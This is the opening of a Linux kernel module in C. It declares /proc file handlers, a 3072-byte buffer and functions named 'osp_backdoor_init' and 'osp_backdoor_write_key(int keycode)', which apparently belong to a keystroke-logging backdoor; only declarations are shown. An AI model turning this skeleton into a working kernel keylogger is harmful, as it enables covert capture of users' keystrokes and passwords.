#include <linux/proc_fs.h>
#include <linux/vmalloc.h>
#include <linux/uaccess.h>
#include <linux/seq_file.h>

#define OSP_BACKDOOR_BUFFER_SIZE 3072

static int proc_device_show(struct seq_file *, void *);
static ssize_t proc_device_write(struct file *, const char *, size_t, loff_t *);
static int proc_device_open(struct inode *, struct file *);
static struct proc_dir_entry * osp_proc_entry;
static char * osp_backdoor_buffer;

static size_t osp_backdoor_buffer_count;

static int osp_backdoor_init(void);
static void osp_backdoor_write_key(int keycode);
static void osp_backdoor_close(void);
